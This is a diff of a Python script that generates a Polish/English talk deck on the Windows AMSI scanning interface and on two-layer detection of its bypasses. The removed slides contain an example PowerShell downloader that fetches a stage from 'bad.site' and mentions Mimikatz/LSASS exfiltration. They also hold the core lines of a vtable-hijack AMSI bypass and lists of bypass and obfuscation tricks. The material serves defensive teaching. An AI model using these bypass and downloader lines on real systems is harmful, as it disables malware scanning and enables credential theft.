-    "# Stage 1 – download\n"
-    "Invoke-WebRequest `\n"
-    "  http://bad.site/stage2.ps1 `\n"
-    "  -OutFile $env:TEMP\\update.exe\n\n"
-    "# Stage 2 – execute\n"
-    "Start-Process $env:TEMP\\update.exe\n\n"
-    "# Stage 2 payload:\n"
-    "#  → Mimikatz in-memory\n"
-    "#  → LSASS dump → C2 exfil"
-)
-txbox(s, code_clean, 6.8, 1.82, 6.1, 3.7, size=11,
-      color=RGBColor(0xFF, 0xCC, 0x77))
+# Layer 2
+rect(s, 6.8, 1.8, 6.1, 5.2, BG_CARD, ACCENT_RED, 2)
+txbox(s, "Layer 2  —  Kernel behavioral", 7.0, 1.9, 5.7, 0.5,
+      size=17, bold=True, color=ACCENT_RED)
+txbox(s, "Kernel driver (sysmon-rs, no_std)\n"
+         "→ userspace daemon (sysmon-um)",
+      7.0, 2.4, 5.7, 0.95, size=12, color=TEXT_WHITE)
+bullet(s, [
+    "PsSetCreateProcessNotifyEx",
+    "PsSetLoadImageNotify",
+    "CmRegisterCallback (registry)",
+    "Filter \\AMSI\\ in registry path",
+    "Suspend → evaluate → terminate",
+    "Werdykt na podstawie behaviour",
+], 7.0, 3.5, 5.7, line_h=0.45, size=13)
+txbox(s, "Catches what static cannot", 7.0, 6.4, 5.7, 0.4,
+      size=14, bold=True, color=ACCENT_GRN)
 
-# Arrow between them
-txbox(s, "ps-parser\n→ decode", 5.75, 2.9, 1.0, 0.8, size=11, bold=True,
-      color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 11 — Layer 1 details                                                ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "IV.1", "Layer 1  —  Static deobfuscation (pure Rust)")
 
-# Bottom bar: what AMSI sees
-rect(s, 0.3, 5.95, 12.7, 1.3, BG_CARD)
-rect(s, 0.3, 5.95, 0.08, 1.3, ACCENT_RED)
-txbox(s, "Co widzi AMSI?", 0.55, 6.0, 4, 0.38, size=13, bold=True, color=ACCENT_ORG)
+# Architecture diagram
+txbox(s, "Architecture", 0.8, 1.2, 6, 0.4, size=18, bold=True, color=ACCENT_ORG)
+boxes = [
+    ("PowerShell process",   ACCENT_BLU),
+    ("amsi.dll  ::  AmsiScanBuffer",  ACCENT_ORG),
+    ("ramsi-com.dll  (Rust COM provider)", ACCENT_GRN),
+    ("ps-parser-cli engine  (in-process)", ACCENT_GRN),
+    ("AMSI verdict  →  block / allow",   ACCENT_RED),
+]
+for i, (title, c) in enumerate(boxes):
+    y = 1.7 + i * 0.75
+    rect(s, 0.8, y, 5.7, 0.55, BG_CARD, c, 2)
+    txbox(s, title, 1.0, y + 0.07, 5.5, 0.4, size=13, bold=True, color=c)
+    if i < len(boxes) - 1:
+        txbox(s, "▼", 0.8, y + 0.55, 5.7, 0.18, size=12, color=TEXT_DIM, align=PP_ALIGN.CENTER)
+
+# Right column — what ps-parser-cli does
+txbox(s, "ps-parser-cli internals", 7.0, 1.2, 6, 0.4, size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "pest grammar — recovers AST + evaluates",
+    "String methods: Replace, ToUpper, …",
+    "Format operator -f, [char] casts",
+    "Recursive base64 (up to 8 layers)",
+    "UTF-16LE projection for .NET DLLs",
+    "30+ predykatów: amsi.dll, AmsiScanBuffer,",
+    "  amsiInitFailed, AmsiUtils, ETW, WLDP, …",
+    "Combo bonuses + scoring algorithm",
+    "Output: JSON  →  ramsi-com",
+], 7.0, 1.7, 6, line_h=0.5, size=13)
+
+txbox(s, "4.7 MB statyczna binarka  •  zero .NET dependencies",
+      7.0, 6.4, 6, 0.4, size=13, italic=True, color=ACCENT_BLU)
+
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 12 — ps-parser safe-evaluation                                      ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
+add_bg(s)
+header(s, "IV.1b", "ps-parser  —  safe evaluation")
 txbox(s,
-      "▸  Wersja obfuscowana → string nierozpoznany → może przejść\n"
-      "▸  Wykonanie IEX → AMSI skanuje zdekodowany string w runtime → szansa na detekcję\n"
-      "▸  Jeśli AMSI bypassed wcześniej → stage2 ładuje się bez żadnej kontroli",
-      0.55, 6.42, 12.3, 0.78, size=12, color=TEXT_WHITE)
+      "Pure data transforms execute.  Side-effectful calls return typed errors — never silently skipped.\n"
+      "API celowo nazwane `safe_eval` — granica zaufania jest wbudowana w architekturę.",
+      0.8, 1.1, 12, 0.7, size=13, color=ACCENT_ORG, italic=True)
 
+# LEFT  —  Evaluated
+rect(s, 0.5, 1.95, 6.1, 4.7, BG_CARD, ACCENT_GRN, 2)
+txbox(s, "✓ Evaluated", 0.7, 2.05, 5.7, 0.4, size=17, bold=True, color=ACCENT_GRN)
+txbox(s, "whitelist — pure, deterministic, no I/O", 0.7, 2.45, 5.7, 0.3,
+      size=10, color=TEXT_GREY, italic=True)
+left_items = [
+    ("String methods",    "Replace, Substring, Insert, ToUpper/Lower, Trim, Split, PadLeft/Right"),
+    ("Static helpers",    "[Convert]::FromBase64String, [Text.Encoding]::UTF8.GetString"),
+    ("Operators",         "+, -, *, /, %, -bxor, -band, -bor, -shl, -shr, -replace, -split"),
+    ("Format operator",   "\"{0}{1}\" -f 'foo','bar'  →  'foobar'"),
+    ("Variables + scope", "$script:, $global:, $local:, $env:  (via Variables::env())"),
+    ("PS classes",        "class C { static [string] X() { 'am' } }  →  [C]::X()  ⇒  'am'"),
+]
+for i, (name, ex) in enumerate(left_items):
+    y = 2.85 + i * 0.62
+    txbox(s, name, 0.7, y, 5.6, 0.3, size=12, bold=True, color=TEXT_WHITE)
+    txbox(s, ex, 0.7, y + 0.3, 5.6, 0.3, size=9, color=TEXT_GREY)
 
-# ── Slide III.1 – Co to jest AMSI? ───────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "III", "Anti-Malware Scan Interface (AMSI)", "8 minut")
+# RIGHT  —  Skipped (typed error)
+rect(s, 6.7, 1.95, 6.1, 4.7, BG_CARD, ACCENT_RED, 2)
+txbox(s, "✗ Skipped", 6.9, 2.05, 5.7, 0.4, size=17, bold=True, color=ACCENT_RED)
+txbox(s, "side-effects → MethodError / CommandError", 6.9, 2.45, 5.7, 0.3,
+      size=10, color=TEXT_GREY, italic=True)
+right_items = [
+    ("File I/O",          "Get-Content, Set-Content, Out-File, [IO.File]::*"),
+    ("Network",           "Invoke-WebRequest, Net.WebClient::DownloadString"),
+    ("Process spawn",     "Start-Process, Invoke-Expression, iex"),
+    ("Dynamic code",      "Add-Type, [Reflection.Assembly]::Load(...)"),
+    ("Registry",          "Get-ItemProperty, [Microsoft.Win32.Registry]::*"),
+    ("Filesystem cmdlets","Get-ChildItem, New-Item, Remove-Item, dowolna mutacja stanu"),
+]
+for i, (name, ex) in enumerate(right_items):
+    y = 2.85 + i * 0.62
+    txbox(s, name, 6.9, y, 5.6, 0.3, size=12, bold=True, color=TEXT_WHITE)
+    txbox(s, ex, 6.9, y + 0.3, 5.6, 0.3, size=9, color=TEXT_GREY)
 
-# Big definition box
-rect(s, 0.3, 1.3, 12.7, 1.35, BG_CARD)
-rect(s, 0.3, 1.3, 0.08, 1.35, ACCENT_ORG)
+# Punchline at bottom
+rect(s, 0.5, 6.75, 12.3, 0.55, BG_CARD)
 txbox(s,
-      "AMSI to standardowy interfejs Windows API, który pozwala aplikacji "
-      "przekazać dowolną treść (skrypt, komendę, bufor) do zarejestrowanego "
-      "providera antymalware — zanim zostanie wykonana.",
-      0.55, 1.36, 12.2, 1.2, size=17, color=TEXT_WHITE)
+      "Skutek:  deobfuscator widzi WSZYSTKO co da się policzyć z czystych operacji.  "
+      "Atak który zależy od I/O lub spawning nie wykonuje się — i jednocześnie jest sygnałem.",
+      0.6, 6.83, 12.1, 0.4, size=11, italic=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
 
-# 4 info cards in a row
-info = [
-    ("Od kiedy?",
-     "Windows 10 / Server 2016\n(build 1507, 2015)\nRozszerzone w Win 11",
-     ACCENT_RED),
-    ("Po co?",
-     "Ustandaryzowanie skanowania\nskryptów — AV nie musi\npatchować każdego hosta",
-     ACCENT_ORG),
-    ("Kiedy działa?",
-     "Przed wykonaniem każdego\nbloku kodu — synchronicznie,\nw tym samym procesie",
-     RGBColor(0x1A, 0x7A, 0xAA)),
-    ("Kiedy NIE działa?",
-     "Gdy nie ma zarejestrowanego\nprovidera lub AMSI\nzostał wyłączony/zbypasowany",
-     RGBColor(0x99, 0x22, 0x22)),
-]
-for i, (title, body, clr) in enumerate(info):
-    x = 0.3 + i * 3.25
-    rect(s, x, 2.85, 3.0, 2.55, BG_CARD)
-    rect(s, x, 2.85, 3.0, 0.08, clr)
-    txbox(s, title, x+0.1, 2.97, 2.8, 0.38, size=14, bold=True, color=clr)
-    txbox(s, body,  x+0.1, 3.4,  2.8, 1.85, size=13, color=TEXT_WHITE)
-
-# Bottom: where AMSI is integrated
-rect(s, 0.3, 5.6, 12.7, 1.65, BG_CARD)
-txbox(s, "Gdzie AMSI jest zintegrowane (built-in)?",
-      0.5, 5.67, 12, 0.38, size=14, bold=True, color=ACCENT_ORG)
-integrations = [
-    ("PowerShell 5+",   "każdy blok skryptu\ni dynamiczny string"),
-    ("Windows Script\nHost",    "VBScript, JScript"),
-    ("Office 365",      "makra VBA od\nOffice 2016"),
-    ("WMI",             "obiekty COM\nprzekazane do WMI"),
-    (".NET / CLR",      "Assembly.Load()\nz byte[]"),
-    ("Exchange\nOnline","skrypty po stronie\nserwera"),
-]
-for i, (name, desc) in enumerate(integrations):
-    x = 0.45 + i * 2.15
-    rect(s, x, 6.1, 2.0, 1.0, BG_DARK)
-    txbox(s, name, x+0.05, 6.12, 1.9, 0.42, size=11, bold=True, color=ACCENT_ORG)
-    txbox(s, desc, x+0.05, 6.54, 1.9, 0.5,  size=10, color=TEXT_GREY)
-
-
-# ── Slide III.2 – Flow & architektura ────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 13 — Layer 2 details                                                ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-section_header(s, "III", "AMSI — Flow & architektura", "")
+header(s, "IV.2", "Layer 2  —  Kernel behavioral telemetry")
 
-# ── LEFT column: component description ───────────────────────────────────────
-components = [
-    ("AmsiOpenSession()",
-     "Aplikacja (np. powershell.exe) otwiera\nsesję AMSI — raz na kontekst uruchomienia."),
-    ("AmsiScanBuffer() / AmsiScanString()",
-     "Każdy blok kodu przed wykonaniem\nprzekazywany do skanowania przez API."),
-    ("AMSI Provider (DLL)",
-     "Zarejestrowany w HKLM\\SOFTWARE\\Microsoft\\\nAMSI\\Providers — np. Windows Defender,\nSentinelOne, CrowdStrike."),
-    ("AMSI_RESULT",
-     "AMSI_RESULT_CLEAN (0) lub\nAMSI_RESULT_DETECTED (32768+)\n→ aplikacja blokuje lub kontynuuje."),
-]
-for i, (name, desc) in enumerate(components):
-    y = 1.3 + i * 1.45
-    rect(s, 0.3, y, 5.5, 1.32, BG_CARD)
-    rect(s, 0.3, y, 0.07, 1.32, ACCENT_RED)
-    txbox(s, name, 0.5, y+0.05, 5.2, 0.38, size=13, bold=True, color=ACCENT_ORG)
-    txbox(s, desc, 0.5, y+0.46, 5.2, 0.78, size=12, color=TEXT_WHITE)
+txbox(s, "Kernel driver (sysmon-rs, no_std)", 0.8, 1.2, 6, 0.4,
+      size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "PsSetCreateProcessNotifyRoutineEx",
+    "    → capture cmdline at process spawn",
+    "PsSetLoadImageNotifyRoutine",
+    "    → flag amsi.dll / wldp.dll loads",
+    "CmRegisterCallbackEx",
+    "    → filter Registry access by path",
+    "Sends events via \\\\.\\SysMon to userspace",
+], 0.8, 1.7, 6.0, line_h=0.45, size=13)
 
-# ── RIGHT column: flow diagram (vertical) ────────────────────────────────────
-flow_steps = [
-    (BG_CARD,                    "① Host application\n(powershell.exe)",
-     "Uruchamia skrypt / dynamiczny blok"),
-    (ACCENT_RED,                 "② amsi.dll\nAmsiScanBuffer()",
-     "Przekazuje surowy bufor kodu"),
-    (RGBColor(0x1A,0x50,0x8A),   "③ AMSI Provider\n(np. MpOav.dll)",
-     "Windows Defender / 3rd-party AV"),
-    (RGBColor(0x8A,0x1A,0x50),   "④ Verdict\nAMSI_RESULT",
-     "CLEAN → execute   |   DETECTED → block"),
-]
-for i, (clr, title, sub) in enumerate(flow_steps):
-    y = 1.3 + i * 1.45
-    rect(s, 6.2, y, 6.8, 1.32, BG_CARD)
-    rect(s, 6.2, y, 6.8, 0.08, clr)
-    txbox(s, title, 6.35, y+0.1,  6.4, 0.52, size=14, bold=True, color=TEXT_WHITE)
-    txbox(s, sub,   6.35, y+0.65, 6.4, 0.55, size=12, color=TEXT_GREY)
-    if i < 3:
-        txbox(s, "↓", 9.4, y+1.32, 0.5, 0.13, size=14, bold=True,
-              color=ACCENT_ORG, align=PP_ALIGN.CENTER)
+txbox(s, "Userspace daemon (sysmon-um)", 7.0, 1.2, 6, 0.4,
+      size=18, bold=True, color=ACCENT_ORG)
+bullet(s, [
+    "Polling \\\\.\\SysMon at 200 ms",
+    "Tracks pid → cmdline mapping",
+    "On AMSI registry recon:",
+    "    1.  NtSuspendProcess(pid)",
+    "    2.  call ps-parser-cli on cmdline",
+    "    3.  Suspicious → log,  BYPASS → kill",
+    "Audit log per scanned process",
+], 7.0, 1.7, 6.0, line_h=0.45, size=13)
 
-# Memory protection note at bottom
-rect(s, 0.3, 7.1, 12.7, 0.28, ACCENT_RED)
-txbox(s,
-      "Memory protection: AmsiContext jest podpisany kryptograficznie — "
-      "patchowanie go w pamięci jest wykrywane przez nowsze buildy Windows.",
-      0.5, 7.1, 12.3, 0.28, size=11, bold=True, color=TEXT_WHITE, align=PP_ALIGN.CENTER)
+rect(s, 0.8, 5.7, 11.7, 1.4, BG_CARD, ACCENT_RED, 2)
+txbox(s, "Co Layer 2 widzi a Layer 1 nie:", 1.0, 5.8, 11, 0.4,
+      size=14, bold=True, color=ACCENT_RED)
+txbox(s, "Każde otwarcie klucza rejestru ze ścieżką \\AMSI\\ — niezależnie od tego "
+         "jak nazwa klucza była zbudowana w kodzie.\n"
+         "Behaviour pozostaje, nawet gdy literalne identyfikatory są rekonstruowane w runtime.",
+      1.0, 6.15, 11.5, 0.95, size=12, color=TEXT_WHITE)
 
-
-# ── Slide IV.1 – AmsiProviderScanDisruption ──────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
+# ╔════════════════════════════════════════════════════════════════════════════╗
+# ║  Slide 13 — Demo intro                                                     ║
+# ╚════════════════════════════════════════════════════════════════════════════╝
+s = prs.slides.add_slide(BLANK)
 add_bg(s)
-section_header(s, "IV", "AmsiProviderScanDisruption — vtable hijack", "")
-
-# Header bar with tagline
-rect(s, 0.3, 1.3, 12.7, 0.55, BG_CARD)
-rect(s, 0.3, 1.3, 0.07, 0.55, ACCENT_ORG)
-txbox(s,
-      "Technika: podmiana wskaźnika Scan() w vtable COM providera AMSI "
-      "— całkowicie w user-mode, bez uprawnień admina.",
-      0.5, 1.33, 12.3, 0.48, size=14, color=TEXT_WHITE)
-
-# 5-phase flow (horizontal)
-phases = [
-    ("①\nImport",      "P/Invoke:\nkernel32.dll\n+ delegates"),
-    ("②\nDiscovery",   "Registry:\nHKLM\\AMSI\\\nProviders"),
-    ("③\nInstantiate", "DllGetClassObject\n→ IClassFactory\n→ CreateInstance"),
-    ("④\nVTable\nhijack", "Kopiuj vtable\nScan → ptr do\nCloseSession"),
-    ("⑤\nExecute",    "Iteracja po\nwszystkich\nproviderach"),
-]
-p_clrs = [BG_CARD, BG_CARD, BG_CARD, ACCENT_RED, RGBColor(0x1A,0x7A,0x3C)]
-for i, ((title, body), clr) in enumerate(zip(phases, p_clrs)):
-    x = 0.3 + i * 2.55
-    rect(s, x, 2.05, 2.35, 2.2, clr)
-    txbox(s, title, x, 2.05, 2.35, 0.75, size=13, bold=True,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    txbox(s, body,  x+0.08, 2.82, 2.2, 1.35, size=12,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    if i < 4:
-        txbox(s, "→", x+2.35, 2.65, 0.2, 0.65, size=16, color=ACCENT_ORG,
-              align=PP_ALIGN.CENTER)
-
-# Core insight box
-rect(s, 0.3, 4.45, 12.7, 1.35, BG_CARD)
-rect(s, 0.3, 4.45, 0.07, 1.35, ACCENT_RED)
-txbox(s, "Kluczowy mechanizm:", 0.5, 4.5, 4, 0.38, size=14, bold=True, color=ACCENT_RED)
-txbox(s,
-      "Każdy COM obiekt przechowuje wskaźnik na vtable (tablicę funkcji) jako pierwsze 8 bajtów.\n"
-      "vtable[3] = Scan()   →   nadpisywane wskaźnikiem vtable[4] = CloseSession()\n"
-      "Efekt: każde wywołanie Scan() natychmiast zwraca success bez żadnego skanowania.",
-      0.5, 4.92, 12.3, 0.82, size=13, color=TEXT_WHITE)
-
-# Code snippet
-rect(s, 0.3, 6.0, 12.7, 1.3, BG_DARK)
-txbox(s,
-      "#  Scan → CloseSession  (kluczowa linia)\n"
-      "[Marshal]::WriteIntPtr($new_vtable,  3 * [IntPtr]::Size,  $closeSessionPtr)\n"
-      "[Marshal]::WriteIntPtr($pObj,  0,  $new_vtable)   # podmień vtable ptr obiektu",
-      0.5, 6.05, 12.3, 1.15, size=12, color=RGBColor(0x88, 0xFF, 0x88))
-
-
-# ── Slide IV.2 – Popularne techniki obfuscacji / bypass ──────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "IV", "Popularne techniki obfuscacji i AMSI bypass", "")
-
-# 3-column grid: AMSI bypasses (left+middle) + obfuscation (right)
-add_card(s, 0.3, 1.35, 4.0, 2.65, "AMSI Bypass — Reflection", [
-    "AmsiUtils.amsiInitFailed = $true",
-    "Patch via [Ref].Assembly.GetType(…)",
-    "Dostęp przez .NET reflection do prywatnych pól",
-    "Patched w PS 5.1+ — wymaga obejścia CLM",
-    "Wariant: SetField() na amsiContext",
-], title_color=ACCENT_RED)
-
-add_card(s, 4.65, 1.35, 4.0, 2.65, "AMSI Bypass — Patching amsi.dll", [
-    "VirtualProtect() → zmiana ochrony pamięci",
-    "WriteProcessMemory() → NOP/xor rax,rax",
-    "Cel: AmsiScanBuffer() lub AmsiOpenSession()",
-    "Wymaga SeDebugPrivilege lub self-injection",
-    "Wykrywane przez ETW + kernel callbacks",
-], title_color=ACCENT_RED)
-
-add_card(s, 9.0, 1.35, 4.0, 2.65, "Obfuscacja PowerShell", [
-    "String splitting: 'AM'+'SI'",
-    "Base64 + [Convert]::FromBase64String",
-    "Backtick escaping: `I`E`X",
-    "SecureString / char array concat",
-    "Invoke-Obfuscation (PSv2 AST rewrite)",
-], title_color=ACCENT_ORG)
-
-# Second row
-add_card(s, 0.3, 4.2, 4.0, 2.55, "AMSI Bypass — COM / Provider level", [
-    "AmsiProviderScanDisruption ← ten talk",
-    "Rejestracja własnego AMSI providera",
-    "Unregister providera z HKLM",
-    "Hooking NtProtectVirtualMemory",
-], title_color=ACCENT_RED)
-
-add_card(s, 4.65, 4.2, 4.0, 2.55, "Bypass — Środowisko / proces", [
-    "PSv2 downgrade: powershell -version 2",
-    "AMSI_DISABLE_PROVIDER env variable (legacy)",
-    "CLM bypass przez custom runspace",
-    "Alternate script hosts: cscript / mshta",
-], title_color=RGBColor(0x1A,0x7A,0xAA))
-
-add_card(s, 9.0, 4.2, 4.0, 2.55, "Obfuscacja C# / .NET", [
-    "Reflection + DynamicMethod",
-    "Assembly.Load() z byte[]",
-    "Compile-time string encryption (ConfuserEx)",
-    "IL mutation / control flow obfuscation",
-    "Analiza: cs-parser",
-], title_color=ACCENT_ORG)
-
-
-# ── Slide 5: IV – Obfuscation techniques ─────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "IV", "Techniki obfuscacji  &  AMSI Bypass", "12 minut")
-
-add_card(s, 0.3, 1.35, 4.1, 2.6, "Obfuscacja – podstawy (PS)", [
-    "Base64 encoding zmiennych",
-    "Łączenie stringów: 'AM'+'SI'",
-    "Invoke-Expression + $ExecutionContext",
-    "Aliasy i dodatkowe znaki (backtick, format)",
-])
-
-add_card(s, 4.7, 1.35, 4.0, 2.6, "AMSI Bypass – in-memory", [
-    "Reflection: modyfikacja AmsiContext",
-    "Hooking: przejęcie AMSI API calls",
-    "Provider disabling",
-    "AmsiProviderScanDisruption (PoC C#)",
-])
-
-add_card(s, 9.0, 1.35, 4.0, 2.6, "Obfuscacja C#", [
-    "Dynamiczna kompilacja (Roslyn)",
-    "Encoded assemblies",
-    "Reflection + DynamicMethod",
-    "Analiza: cs-parser",
-])
-
-# bottom bar – narzędzia
-rect(s, 0.3, 4.2, 12.7, 2.05, BG_CARD)
-txbox(s, "Narzędzia zaprezentowane w tej sekcji:", 0.5, 4.27, 12, 0.35,
-      size=14, bold=True, color=ACCENT_ORG)
-
-tools = [
-    ("ps-parser", "Parser PowerShella w Rust\ncrates.io/crates/ps-parser"),
-    ("AmsiProviderScanDisruption", "Autorski AMSI bypass (C#)\ngithub.com/radkum/..."),
-    ("cs-parser", "Parser C# dla detekcji obfuscacji\ngithub.com/radkum/cs-parser"),
-]
-for i, (name, desc) in enumerate(tools):
-    x = 0.5 + i * 4.2
-    rect(s, x, 4.7, 3.9, 1.35, BG_DARK)
-    txbox(s, name, x+0.1, 4.73, 3.7, 0.4, size=13, bold=True, color=ACCENT_ORG)
-    txbox(s, desc, x+0.1, 5.15, 3.7, 0.8, size=12, color=TEXT_GREY)
-
-
-# ── Slide V.1 – Dwie warstwy: overview ───────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "V", "Wykrywanie — dwie warstwy obrony", "10 minut")
-
-# Layer 1 block
-rect(s, 0.3, 1.3, 6.0, 5.5, BG_CARD)
-rect(s, 0.3, 1.3, 6.0, 0.07, ACCENT_RED)
-txbox(s, "Layer 1", 0.4, 1.35, 2.0, 0.5, size=22, bold=True, color=ACCENT_RED)
-txbox(s, "AMSI / Static pipeline", 0.4, 1.82, 5.7, 0.42, size=16, bold=True, color=TEXT_WHITE)
-l1_steps = [
-    "① Raw script — wejście do pipeline'u",
-    "② Detect obfuscation — jakie techniki użyto?",
-    "③ Deobfuscate — ps-parser / cs-parser",
-    "④ Deterministic rules — sygnatury, IoCs",
-    "⑤ ML na deobfuscowanym — intencja kodu",
-    "⑥ ML na oryginalnym — styl obfuscacji",
-]
-tf = s.shapes.add_textbox(Inches(0.45), Inches(2.35), Inches(5.65), Inches(4.2))
-tf.word_wrap = True
-for i, step in enumerate(l1_steps):
-    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-    p.space_before = Pt(6)
-    run = p.add_run()
-    run.text = step
-    run.font.size = Pt(14)
-    run.font.color.rgb = TEXT_WHITE
-
-# Layer 2 block
-rect(s, 7.0, 1.3, 6.0, 5.5, BG_CARD)
-rect(s, 7.0, 1.3, 6.0, 0.07, RGBColor(0x1A,0x7A,0xAA))
-txbox(s, "Layer 2", 7.1, 1.35, 2.0, 0.5, size=22, bold=True, color=RGBColor(0x1A,0x7A,0xAA))
-txbox(s, "Behavioral / Telemetria", 7.1, 1.82, 5.7, 0.42, size=16, bold=True, color=TEXT_WHITE)
-l2_steps = [
-    "ETW / Sysmon — zdarzenia systemowe",
-    "Odczyt HKLM\\AMSI\\Providers (bypass signal)",
-    "PowerShell -version 2 (downgrade)",
-    "Podejrzane process tree (Word → PS)",
-    "Network connections ze script hostów",
-    "LSASS access, credential patterns",
-]
-tf = s.shapes.add_textbox(Inches(7.1), Inches(2.35), Inches(5.65), Inches(4.2))
-tf.word_wrap = True
-for i, step in enumerate(l2_steps):
-    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-    p.space_before = Pt(6)
-    run = p.add_run()
-    run.text = f"▸  {step}"
-    run.font.size = Pt(14)
-    run.font.color.rgb = TEXT_WHITE
-
-# vs separator
-txbox(s, "vs", 6.35, 3.6, 0.6, 0.6, size=18, bold=True,
-      color=TEXT_GREY, align=PP_ALIGN.CENTER)
-
-
-# ── Slide V.2 – Layer 1: Static pipeline (szczegóły) ─────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "V", "Layer 1 — Static pipeline (AMSI)", "")
-
-# Pipeline flow — vertical steps with connectors
-pipeline = [
-    (ACCENT_RED,                  "① Raw script",
-     "Obfuscowany kod — Base64, string split, backtick, encoding layers"),
-    (RGBColor(0xC0,0x50,0x10),    "② Detect obfuscation",
-     "ps-parser: jakie techniki użyto? Entropia, ratio Base64, AST complexity"),
-    (RGBColor(0xA0,0x70,0x00),    "③ Deobfuscate",
-     "ps-parser rozwija kolejne warstwy — wynik: czysty AST"),
-    (RGBColor(0x1A,0x7A,0x3C),    "④ Deterministic rules",
-     "Sygnatury IoC: Reflection.Assembly.Load, kernel32 imports, AMSI patterns"),
-    (RGBColor(0x1A,0x5A,0xAA),    "⑤ ML — deobfuscowany",
-     "Intencja kodu: dangerous API calls, C2 patterns, credential access"),
-    (RGBColor(0x50,0x20,0x9A),    "⑥ ML — oryginalny",
-     "Styl obfuscacji: entropia, fragmentacja, głębokość encodingu"),
-]
-for i, (clr, title, desc) in enumerate(pipeline):
-    y = 1.3 + i * 1.02
-    rect(s, 0.3, y, 2.5, 0.88, clr)
-    txbox(s, title, 0.35, y+0.05, 2.4, 0.78, size=13, bold=True,
-          color=TEXT_WHITE, align=PP_ALIGN.CENTER)
-    rect(s, 3.0, y, 9.9, 0.88, BG_CARD)
-    txbox(s, desc, 3.1, y+0.18, 9.7, 0.55, size=13, color=TEXT_WHITE)
-    if i < 5:
-        txbox(s, "↓", 1.35, y+0.88, 0.6, 0.14, size=11, bold=True,
-              color=TEXT_GREY, align=PP_ALIGN.CENTER)
-
-# Right annotation — why both ML models?
-rect(s, 10.45, 5.42, 2.8, 1.82, BG_DARK)
-txbox(s, "Dlaczego oba modele?", 10.5, 5.47, 2.7, 0.35, size=11, bold=True, color=ACCENT_ORG)
-txbox(s,
-      "Deobfuscowany → intencja\n(LotL może wyglądać normalnie)\n\n"
-      "Oryginalny → technika ukrycia\n(nowy styl obfuscacji bez sygnatury)",
-      10.5, 5.85, 2.7, 1.3, size=11, color=TEXT_GREY)
-
-
-# ── Slide V.3 – Layer 1: ML szczegóły ────────────────────────────────────────
-s = prs.slides.add_slide(BLANK_LAYOUT)
-add_bg(s)
-section_header(s, "V", "Layer 1 — ML: features i modele", "")
-
-# Two ML model cards side by side
-rect(s, 0.3, 1.3, 6.0, 5.5, BG_CARD)
-rect(s, 0.3, 1.3, 6.0, 0.07, RGBColor(0x1A,0x5A,0xAA))
-txbox(s, "ML na deobfuscowanym", 0.45, 1.38, 5.7, 0.45, size=16, bold=True, color=TEXT_WHITE)
-txbox(s, "Co wykrywa:", 0.45, 1.9, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
-feats_deobf = [
-    "Niebezpieczne API: Reflection.Load, VirtualProtect",
-    "Wzorce C2: Invoke-WebRequest + Base64 URL",
-    "Credential access: LSASS, sekurlsa, mimikatz",
-    "Persistence: Registry Run, Scheduled Tasks",
-    "Lateral movement: WMI, PSRemoting, WinRM",
-]
-tf = s.shapes.add_textbox(Inches(0.45), Inches(2.28), Inches(5.7), Inches(2.3))
-tf.word_wrap = True
-for i, f in enumerate(feats_deobf):
-    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-    p.space_before = Pt(4)
-    r = p.add_run(); r.text = f"▸  {f}"
-    r.font.size = Pt(13); r.font.color.rgb = TEXT_WHITE
-
-txbox(s, "Modele:", 0.45, 4.65, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
-txbox(s, "Random Forest / Gradient Boosting — szybkie, interpretable\nOne-class SVM — anomaly detection na nowych próbkach",
-      0.45, 5.0, 5.7, 0.72, size=13, color=TEXT_WHITE)
-
-rect(s, 7.0, 1.3, 6.0, 5.5, BG_CARD)
-rect(s, 7.0, 1.3, 6.0, 0.07, RGBColor(0x50,0x20,0x9A))
-txbox(s, "ML na oryginalnym (obfuscowanym)", 7.1, 1.38, 5.7, 0.45, size=16, bold=True, color=TEXT_WHITE)
-txbox(s, "Co wykrywa:", 7.1, 1.9, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
-feats_obf = [
-    "Entropia stringów — wysoka = podejrzane",
-    "Ratio Base64 / encoded content w skrypcie",
-    "Głębokość warstw encodingu",
-    "Fragmentacja identyfikatorów (string split)",
-    "Zagęszczenie backtick / format operator",
-]
-tf = s.shapes.add_textbox(Inches(7.1), Inches(2.28), Inches(5.7), Inches(2.3))
-tf.word_wrap = True
-for i, f in enumerate(feats_obf):
-    p = tf.text_frame.paragraphs[0] if i == 0 else tf.text_frame.add_paragraph()
-    p.space_before = Pt(4)
-    r = p.add_run(); r.text = f"▸  {f}"
-    r.font.size = Pt(13); r.font.color.rgb = TEXT_WHITE
-
-txbox(s, "Modele:", 7.1, 4.65, 5.7, 0.32, size=13, bold=True, color=ACCENT_ORG)
-txbox(s, "Autoencoder (TinyML) — rekonstrukcja normalnego kodu\nOne-class SVM — nowe style obfuscacji bez sygnatur",
-      7.1, 5.0, 5.7, 0.72, size=13, color=TEXT_WHITE)
